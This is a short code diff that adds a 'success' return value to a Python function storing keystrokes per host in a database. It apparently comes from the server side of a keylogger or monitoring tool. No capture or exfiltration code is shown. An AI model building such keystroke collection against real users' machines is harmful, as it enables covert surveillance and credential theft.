@@ -71,6 +71,7 @@ def init():
             print("2")
             database.add_keystroke(host, data)
             print("3")
+            return "success"
         except:
             return "failed"
 
